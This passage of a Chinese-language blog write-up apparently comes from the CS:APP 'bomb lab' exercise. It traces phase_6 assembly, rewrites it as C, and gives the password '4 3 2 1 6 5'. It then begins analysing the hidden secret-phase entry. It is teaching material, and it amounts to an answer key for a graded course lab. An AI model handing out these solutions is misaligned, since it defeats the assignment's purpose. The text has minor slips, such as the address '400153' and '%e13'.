4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp</span><br><span class="line">  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:	8b 00                	mov    (%rax),%eax</span><br><span class="line">  4011e5:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">  4011fb:	5b                   	pop    %rbx</span><br><span class="line">  4011fc:	5d                   	pop    %rbp</span><br><span class="line">  4011fd:	41 5c                	pop    %r12</span><br><span class="line">  4011ff:	41 5d                	pop    %r13</span><br><span class="line">  401201:	41 5e                	pop    %r14</span><br><span class="line">  401203:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010f4:	41 56                	push   %r14</span><br><span class="line">4010f6:	41 55                	push   %r13</span><br><span class="line">4010f8:	41 54                	push   %r12</span><br><span class="line">4010fa:	55                   	push   %rbp</span><br><span class="line">4010fb:	53                   	push   %rbx</span><br><span class="line">4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">40110b:	49 89 e6             	mov    %rsp,%r14</span><br></pre></td></tr></table></figure>
<p>401100将<code>%rsp</code>赋给<code>%r13</code>，401103将<code>%rsp</code>赋给<code>%rsi</code>，40110b将<code>%rsp</code>赋给<code>%r14</code>，401106调用<code>read_six_numbers</code>函数读取6个数字，输入的6个整数依次存放于<code>0(%rsp)</code>、<code>4(%rsp)</code>、<code>8(%rsp)</code>、<code>12(%rsp)</code>、<code>16(%rsp)</code>、<code>20(%rsp)</code>中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:	41 83 c4 01          	add    $0x1,%r12d</span><br><span class="line">40112c:	41 83 fc 06          	cmp    $0x6,%r12d</span><br><span class="line">401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:	44 89 e3             	mov    %r12d,%ebx</span><br><span class="line">401135:	48 63 c3             	movslq %ebx,%rax</span><br><span class="line">401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure>
<p>40110e将<code>%r12d</code>赋为0，401114将<code>%r13</code>赋给<code>%rbp</code>，401117将<code>%r13</code>指向的值赋给<code>%eax</code>，40111b将<code>%eax</code>减1，40111e和401121判断<code>%eax</code>是否不超过5:</p>
<ul>
<li>若<code>%eax</code>超过5，则继续执行401123使炸弹爆炸；</li>
<li>若<code>%eax</code>不超过5，则跳到401128（4010f4+0x34）将<code>%r12d</code>加1，40112c和401130判断<code>%r12d</code>是否为6:<ul>
<li>若为6则跳到401153（4010f4+0x5f）；</li>
<li>若不为6则继续执行401132将<code>%r12d</code>赋给<code>%ebx</code>，401135再将<code>%ebx</code>赋给<code>%rax</code>，401138再将<code>%rsp+%rax+4</code>指向的值（下一个整数）赋给<code>%eax</code>，40113b和40113e判断<code>%eax</code>的值是否等于<code>%rbp</code>指向的值：<ul>
<li>若相等则继续运行401140使炸弹爆炸；</li>
<li>若不等则跳到401145（4010f4+0x51）将<code>%ebx</code>加1，401148和40114b判断<code>%ebx</code>是否不超过5：<ul>
<li>若不超过5则跳到401135（4010f4+0x41）循环；</li>
<li>若超过5则继续执行40114d将<code>%r13</code>加4，401151跳到401114（4010f4+0x20）循环</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>可以看出此处的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">next == <span class="number">0</span>;<span class="comment">// %r12d</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  num = *p_loc;<span class="comment">// %r13-&gt;%rbp, (%r13)-&gt;%eax</span></span><br><span class="line">  <span class="keyword">if</span> (--num &gt; <span class="number">5</span>)<span class="comment">// %eax</span></span><br><span class="line">    explode_bomb();</span><br><span class="line">  next++;<span class="comment">// %r12d</span></span><br><span class="line">  <span class="keyword">if</span> (next == <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = next; i &lt;= <span class="number">5</span>; i++) &#123;<span class="comment">// %r12d-&gt;%ebx; %ebx &lt;= 5</span></span><br><span class="line">    num_next = input[i];<span class="comment">// %ebx-&gt;%rax, (%rsp + %rax + 4)-&gt;%eax</span></span><br><span class="line">    <span class="keyword">if</span> (num_next == *p_loc)<span class="comment">// %eax == (%rbp)</span></span><br><span class="line">      explode_bomb();</span><br><span class="line">  &#125;</span><br><span class="line">  p_loc++;<span class="comment">// %e13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，这6个无符号整数减1后不能超过5（第4、5行），即在1～6之间；且这6个数互不相同（第9～13行），即这6个整数的可能序列是<strong>1～6的全排列</strong>。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>
<p>上一循环跳出后即执行400153将<code>%rsp+24</code>的地址（6个整数末尾的位置）给<code>%rsi</code>，401158将<code>%r14</code>（6个整数开头的位置）赋给<code>%rax</code>，40115b将<code>%ecx</code>赋为7，401160将<code>%ecx</code>（7）赋给<code>%edx</code>，401162将<code>%edx</code>（7）减去<code>%rax</code>指向的值（第“<code>%rax+1</code>”个整数），401164将<code>%edx</code>（7）赋给<code>%rax</code>指向的值（第“<code>%rax+1</code>”个整数），401166将<code>%rax</code>加4（指向下一个整数），40116a和40116d判断<code>%rsi</code>（6个整数末尾的位置）和<code>%rax</code>（逐渐向后移动的指针）是否相等：</p>
<ul>
<li>若不等则跳到401160（4010f4+0x6c）循环；</li>
<li>若相等则继续执行下一部分；</li>
</ul>
<p>可以看出此处的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p_end = rsp + <span class="number">6</span>;<span class="comment">// %rsp + 24-&gt;%rsi</span></span><br><span class="line">ecx = <span class="number">7</span>;<span class="comment">// 7-&gt;%ecx</span></span><br><span class="line"><span class="keyword">for</span> (i = p_begin; i != p_end; i++) &#123;<span class="comment">// %r14-&gt;%rax; %rax != %rsi; %rax += 4</span></span><br><span class="line">  num_new = ecx - *i;<span class="comment">// %ecx-&gt;%edx, %edx - (%rax)-&gt;%edx</span></span><br><span class="line">  *i = num_new;<span class="comment">// %edx-&gt;(%rax)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，原来输入到栈中的第<code>i</code>个整数被重写为<code>7-i</code>，将重写后的6个整数视为数组<code>nums[6]</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:	48 83 c6 04          	add    $0x4,%rsi</span><br><span class="line">401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">40119f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure>
<p>40116f将<code>%esi</code>（外层循环的索引）赋为0，401174跳到401197（4010f4+0xa3）将<code>%rsp</code>指向的值（“数组基地址”）和<code>%rsi</code>指向的值（“偏移量”）相加赋给<code>%ecx</code>（依次取6个整数），40119a和40119d判断<code>%ecx</code>（当前整数）是否不超过1：</p>
<ul>
<li>若不超过1则跳到401183（4010f4+0x8f）将地址<code>0x6032d0</code>赋给<code>%edx</code>（某指针），401188将<code>%rdx</code>（某指针，存放地址<code>0x6032d0</code>）赋给<code>32+%rsp+%rsi*2</code>指向的值，40118d将<code>%rsi</code>加4（外层循环索引向后移动），401191和401195判断<code>%rsi</code>是否等于24（是否走到第6个整数）：<ul>
<li>若等于24则跳到4011ab（4010f4+0xb7）继续执行下一部分；</li>
<li>若不等于24则继续执行401197（外层）循环</li>
</ul>
</li>
<li>若超过1则继续执行40119f将<code>%eax</code>（内层循环的索引）赋为1，4011a4将地址<code>0x6032d0</code>赋给<code>%edx</code>（某指针），4011a9跳到401176（4010f4+0x82）将<code>%rdx+8</code>指向的值（下一个指针的值）赋给<code>%rdx</code>，40117a将<code>%eax</code>（内层循环的索引）加1，40117d和40117f判断<code>%ecx</code>（当前整数）和<code>%eax</code>（内层循环的索引）是否相等：<ul>
<li>若不等则跳到401176（4010f4+0x82）（内层）循环；</li>
<li>若相等则继续执行401181跳到401188（4010f4+0x94）继续外层循环</li>
</ul>
</li>
</ul>
<p>可以看出此处的两层循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; i++) &#123;<span class="comment">// %esi</span></span><br><span class="line">  num = nums[i];<span class="comment">// (%rsp + i)-&gt;%ecx</span></span><br><span class="line">  <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    p = <span class="number">0x6032d0</span>;<span class="comment">// 0x6032d0-&gt;%edx</span></span><br><span class="line">    new_nums[i] = p;<span class="comment">// %rdx-&gt;(%rsp + 2i + 32)</span></span><br><span class="line">    <span class="keyword">goto</span> <span class="number">0x401191</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j != num; j++) &#123;<span class="comment">// %eax</span></span><br><span class="line">      p = <span class="number">0x6032d0</span>;<span class="comment">// 0x6032d0-&gt;%edx</span></span><br><span class="line">      p = *(++p);<span class="comment">// (%rdx + 8)-&gt;%rdx</span></span><br><span class="line">      new_nums[i] = p;<span class="comment">// %rdx-&gt;(%rsp + 2i + 32)</span></span><br><span class="line">      <span class="keyword">goto</span> <span class="number">0x401191</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在意义不改变的基础上再次优化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; i++) &#123;<span class="comment">// %esi</span></span><br><span class="line">  num = nums[i];<span class="comment">// (%rsp + i)-&gt;%ecx</span></span><br><span class="line">  p = <span class="number">0x6032d0</span>;<span class="comment">// 0x6032d0-&gt;%edx</span></span><br><span class="line">  <span class="keyword">if</span> (num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j != num; j++)<span class="comment">// %eax</span></span><br><span class="line">      p = *(++p);<span class="comment">// (%rdx + 8)-&gt;%rdx</span></span><br><span class="line">  &#125;</span><br><span class="line">  new_nums[i] = p;<span class="comment">// %rdx-&gt;(%rsp + 8i + 32)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，此处再次生成了一个新的<strong>地址</strong>数组<code>new_nums[6]</code>（存放的是链表各个结点的<strong>地址</strong>，新数组起始地址是<code>%rsp+32</code>，依次加8），它是以<code>nums[6]</code>数组（上面重写后的）为索引，将（以<code>0x6032d0</code>为头指针的）<strong>链表</strong>的第<code>nums[i]</code>个数的<strong>地址</strong>赋给<code>new_nums[i]</code>。构造这个地址数组的目的就是排序。</p>
<p>由于输入的6个数是1～6的全排列，<code>7-i</code>后依然是1～6的全排列，所以新生成的数组的6个元素可以通过<code>0x6032d0+i</code>（i=1,2,3,4,5,6）来获得（顺序未知），直接<code>gdb</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/24 0x6032d0</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:       332     1       6304480 0</span><br><span class="line">0x6032e0 &lt;node2&gt;:       168     2       6304496 0</span><br><span class="line">0x6032f0 &lt;node3&gt;:       924     3       6304512 0</span><br><span class="line">0x603300 &lt;node4&gt;:       691     4       6304528 0</span><br><span class="line">0x603310 &lt;node5&gt;:       477     5       6304544 0</span><br><span class="line">0x603320 &lt;node6&gt;:       443     6       0       0</span><br></pre></td></tr></table></figure>
<p>左侧为链表6个结点的地址（新数组中的元素），右侧第1列则是6个结点的数据域，第3列是6个结点的指针域（十进制）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax</span><br><span class="line">4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">4011bd:	48 8b 10             	mov    (%rax),%rdx</span><br><span class="line">4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)</span><br><span class="line">4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)</span><br><span class="line">4011d9:	00 </span><br></pre></td></tr></table></figure>
<p>上一部分的循环跳出之后即执行4011ab将<code>%rsp+32</code>指向的值（<code>new_nums[0]</code>）赋给<code>%rbx</code>，4011b0将<code>%rsp+40</code>的地址（新数组第2个元素的地址）赋给<code>%rax</code>（索引），4011b5将<code>%rsp+80</code>的地址（新数组末尾的地址）赋给<code>%rsi</code>，4011ba将<code>%rbx</code>（新数组第1个元素）赋给<code>%rcx</code>，4011bd将<code>%rax</code>指向的值（新数组第<code>%rax</code>个元素）赋给<code>%rdx</code>，4011c0将<code>%rdx</code>（新数组第<code>%rax</code>个元素）赋给<code>%rcx+8</code>指向的值，4011c4将<code>%rax</code>加8，即移动到下一个元素的地址，4011c8和4011cb比较<code>%rax</code>和<code>%rsi</code>：</p>
<ul>
<li>若不等则继续执行4011cd将<code>%rdx</code>赋给<code>%rcx</code>，4011d0跳到4011bd（4010f4+0xc9）循环；</li>
<li>若相等则跳到4011d2（4010f4+0xde）将<code>%rdx+8</code>指向的值赋为0</li>
</ul>
<p>可以看出此处的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">num_begin = *p_new_nums;<span class="comment">// (%rsp + 32)=new_nums[0]-&gt;%rbx</span></span><br><span class="line">p_next = p_new_nums + <span class="number">1</span>;<span class="comment">// %rsp + 40=&amp;new_nums[1]-&gt;%rax</span></span><br><span class="line">p_end = p_new_nums + <span class="number">6</span>;<span class="comment">// %rsp + 80-&gt;%rsi</span></span><br><span class="line"><span class="keyword">for</span> (num = num_begin; p_next != p_end; num = num_next) &#123;<span class="comment">// %rbx-&gt;%rcx; %rax != %rsi; %rdx-&gt;%rcx</span></span><br><span class="line">  num_next = *p_next;<span class="comment">// (%rax)-&gt;%rdx</span></span><br><span class="line">  *(num + <span class="number">1</span>) = num_next;<span class="comment">// %rdx-&gt;(%rcx + 8)</span></span><br><span class="line">  p_next++;<span class="comment">// %rax += 8</span></span><br><span class="line">&#125;</span><br><span class="line">*(num_next + <span class="number">1</span>) = <span class="number">0</span>;<span class="comment">// 0-&gt;(%rdx + 8)</span></span><br></pre></td></tr></table></figure>
<p>可以看出，此处的循环是为新数组<code>new_nums[6]</code>的各个元素添加了指针域，即第<code>i</code>个元素（i=0,1,2,3,4）的指针域用<code>*(new_nums[i] + 1)</code>表示，指向第<code>i+1</code>个元素<code>new_nums[i+1]</code>，第<code>5</code>个元素（第6个地址）的指针域赋为0。这样做的好处是可以直接用元素的值表示下一个元素的值，便于重复赋值。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011da:	bd 05 00 00 00       	mov    $0x5,%ebp</span><br><span class="line">4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:	8b 00                	mov    (%rax),%eax</span><br><span class="line">4011e5:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">4011fb:	5b                   	pop    %rbx</span><br><span class="line">4011fc:	5d                   	pop    %rbp</span><br><span class="line">4011fd:	41 5c                	pop    %r12</span><br><span class="line">4011ff:	41 5d                	pop    %r13</span><br><span class="line">401201:	41 5e                	pop    %r14</span><br><span class="line">401203:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p>上一部分加完指针域后继续执行4011da将<code>%ebp</code>（索引）赋为5，4011df将<code>%rbx+8</code>指向的值（开始时<code>%rbx</code>是<code>new_nums[0]</code>，此时<code>%rbx+8</code>即为新数组第<code>0</code>个元素的指针域，指向的值就是下一个元素）赋给<code>%rax</code>（即当前元素的下一个元素），4011e3将<code>%rax</code>指向的值（新数组下一个元素作为地址指向的值）赋给<code>%eax</code>，4011e5和4011e7将<code>%eax</code>和<code>%rbx</code>指向的值（新数组当前元素作为地址指向的值）比较：</p>
<ul>
<li>若<code>%rbx</code>指向的值（当前元素指向值）小于<code>%eax</code>（下一元素指向值），则继续执行4011e9使炸弹爆炸（由此得知<strong>当前元素指向值必须大于等于下一元素指向值</strong>）；</li>
<li>若<code>%rbx</code>指向的值（当前元素指向值）不小于<code>%eax</code>（下一元素指向值），则跳到4011ee（4010f4+0xfa）将<code>%rbx+8</code>指向的值（下一个元素）赋给<code>%rbx</code>（好处体现），4011f2将<code>%ebp</code>（索引）减1，4011f5判断减1后是否为0:<ul>
<li>若不为0则跳到4011df（4010f4+0xeb）循环；</li>
<li>若为0则继续执行并弹栈<strong>返回</strong></li>
</ul>
</li>
</ul>
<p>可以看出此处的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">5</span>; i != <span class="number">0</span>; i--) &#123;<span class="comment">// %ebp</span></span><br><span class="line">  num_next = *(num + <span class="number">1</span>);<span class="comment">// (%rbx + 8)-&gt;%rax</span></span><br><span class="line">  number_next = *num_next;<span class="comment">// (%rax)-&gt;%eax</span></span><br><span class="line">  <span class="keyword">if</span> (*num &lt; number_next)<span class="comment">// (%rbx) &lt; %eax</span></span><br><span class="line">    explode_bomb();</span><br><span class="line">  num = *(num + <span class="number">1</span>);<span class="comment">// (%rbx + 8)-&gt;%rbx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> num_next;<span class="comment">// %rax</span></span><br></pre></td></tr></table></figure>
<p>可以看出，需要满足<code>*num &gt;= **(num+1)</code>即对于新数组存放的6个地址值，它们对应指向的数据应该按顺序递减。</p>
<hr>
<p>整理一下，我们需要输入6个整数，是1～6的排列，每个数再对7求补，得到新的序列。新的序列一一对应了一个链表的6个结点，即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1:       332</span><br><span class="line">2:       168</span><br><span class="line">3:       924</span><br><span class="line">4:       691</span><br><span class="line">5:       477</span><br><span class="line">6:       443</span><br></pre></td></tr></table></figure>
<p>而这6个结点的数据域（上面右侧一列）需要递减排列：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3:       924</span><br><span class="line">4:       691</span><br><span class="line">5:       477</span><br><span class="line">6:       443</span><br><span class="line">1:       332</span><br><span class="line">2:       168</span><br></pre></td></tr></table></figure>
<p>此时便得到了新的序列为<code>3</code>，<code>4</code>，<code>5</code>，<code>6</code>，<code>1</code>，<code>2</code>。</p>
<p>输入序列为新的序列关于7的补，即为<code>4</code>，<code>3</code>，<code>2</code>，<code>1</code>，<code>6</code>，<code>5</code>。</p>
<p>至此，得到<code>phase_6</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<h1 id="Secret-phase-binary-search-tree"><a href="#Secret-phase-binary-search-tree" class="headerlink" title="Secret phase: binary search tree"></a>Secret phase: <em>binary search tree</em></h1><p>虽然已经解决了6个phase，但在<code>bomb.c</code>的最后却有这样一句话：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment"> * something they overlooked?  Mua ha ha ha ha! */</span></span><br></pre></td></tr></table></figure>
<p>行百里者，半于九十。游戏尚未结束。</p>
<hr>
<p>在<code>objdump</code>反汇编生成的文件中可以看到，6个<code>phase</code>函数的后面存在<code>secret_phase</code>函数，此函数应该是拆除隐藏<code>phase</code>的线索。</p>
<p>但是当6个<code>phase</code>的password输入完成后，程序自动终止。如何进入此<code>secret_phase</code>呢？</p>
<p>可以在<code>objdump</code>反汇编生成的文件中查找<code>secret_phase</code>，看看在哪里调用了此函数，沿此线索可能找到入口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">	...</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>不出所料，在<code>phase_defused</code>函数的401630处调用了<code>secret_phase</code>函数，而根据本文开头对<code>main</code>函数的分析可知在每个<code>phase</code>通过后都会运行<code>phase_defused</code>函数。</p>
<p>下面开始分析<code>phase_defused</code>函数，它很可能就是开启<code>secret_phase</code>大门的<strong>入口</strong>。</p>
<h2 id="Enter"><a href="#Enter" class="headerlink" title="Enter"></a>Enter</h2><p><code>phase_defused</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">  401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:	85 c0                	test   %eax,%eax</span><br><span class="line">  401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">  40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">  401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br><span class="line">  40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax</span><br><span class="line">  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  40164b:	00 00 </span><br><span class="line">  40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:	48 83 c4 78          	add    $0x78,%rsp</span><br><span class="line">  401658:	c3                   	retq   </span><br><span class="line">  401659:	90                   	nop</span><br><span class="line">  40165a:	90                   	nop</span><br><span class="line">  40165b:	90                   	nop</span><br><span class="line">  40165c:	90                   	nop</span><br><span class="line">  40165d:	90                   	nop</span><br><span class="line">  40165e:	90                   	nop</span><br><span class="line">  40165f:	90                   	nop</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
